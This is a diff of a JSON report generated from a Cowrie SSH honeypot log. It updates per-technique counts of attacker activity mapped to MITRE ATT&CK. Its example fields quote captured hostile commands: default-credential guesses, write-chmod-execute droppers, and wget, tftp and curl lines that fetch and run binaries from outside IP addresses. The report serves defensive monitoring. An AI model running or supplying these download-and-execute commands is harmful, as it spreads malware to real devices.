@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-25 11:02:53",
+  "generated": "2026-09-25 12:01:28",
   "totals": {
-    "commands": 2374,
-    "login_failed": 2696,
-    "login_success": 189,
-    "sessions": 3244
+    "commands": 2431,
+    "login_failed": 3151,
+    "login_success": 194,
+    "sessions": 3748
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2696,
+      "count": 3151,
       "examples": [
         "root / casa",
         "root / router",
@@ -21,14 +21,14 @@
         "Admin / "
       ],
       "first": "2026-09-25T00:01:09.150965Z",
-      "last": "2026-09-25T11:02:53.065613Z",
-      "unique_ips": 96
+      "last": "2026-09-25T11:49:08.599125Z",
+      "unique_ips": 98
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 894,
+      "count": 910,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,14 +37,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-25T00:02:44.887220Z",
-      "last": "2026-09-25T10:58:32.144896Z",
-      "unique_ips": 60
+      "last": "2026-09-25T11:44:36.961696Z",
+      "unique_ips": 62
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 255,
+      "count": 256,
       "examples": [
         "uname -a",
         "cat /proc/cpuinfo",
@@ -53,14 +53,14 @@
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
       ],
       "first": "2026-09-25T00:11:42.471742Z",
-      "last": "2026-09-25T10:50:04.462282Z",
-      "unique_ips": 37
+      "last": "2026-09-25T11:06:08.065534Z",
+      "unique_ips": 38
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 189,
+      "count": 194,
       "examples": [
         "root / root",
         "adm / adm",
@@ -69,14 +69,14 @@
         "admin / password"
       ],
       "first": "2026-09-25T00:02:39.589537Z",
-      "last": "2026-09-25T10:57:36.991363Z",
-      "unique_ips": 80
+      "last": "2026-09-25T11:44:33.694568Z",
+      "unique_ips": 83
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 78,
+      "count": 88,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -85,8 +85,8 @@
         "cd /tmp||cd /var/tmp||cd /; (wget -q -O- http://176.65.139.196/bins/kla.sh | sh || curl -s http://176.65.139.196/bins/kl"
       ],
       "first": "2026-09-25T00:20:41.496654Z",
-      "last": "2026-09-25T10:58:32.144896Z",
-      "unique_ips": 37
+      "last": "2026-09-25T11:44:37.929250Z",
+      "unique_ips": 39
     },
     {
       "id": "T1033",
@@ -207,6 +207,18 @@
       "unique_ips": 2
     },
     {
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox bfiNOqXl"
+      ],
+      "first": "2026-09-25T11:40:13.357156Z",
+      "last": "2026-09-25T11:40:13.357156Z",
+      "unique_ips": 1
+    },
+    {
       "id": "T1562.004",
       "name": "Impair Defenses: Disable or Modify System Firewall",
       "tactic": "Defense Evasion",
@@ -222,31 +234,31 @@
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      192
+      195
     ],
     [
       "sh",
-      136
+      139
     ],
     [
       "shell",
-      136
+      139
     ],
     [
       "system",
-      135
+      138
     ],
     [
       "enable",
-      134
+      137
     ],
     [
       "ping; sh",
-      128
+      130
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      64
+      65
     ],
     [
       "/bin/busybox",
@@ -277,6 +289,10 @@
       4
     ],
     [
+      "/bin/busybox bfiNOqXl",
+      3
+    ],
+    [
       "/ip cloud print",
       2
     ],
@@ -294,10 +310,6 @@
     ],
     [
       "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
-      2
-    ],
-    [
-      "echo SHELL_TEST",
       2
     ]
   ]
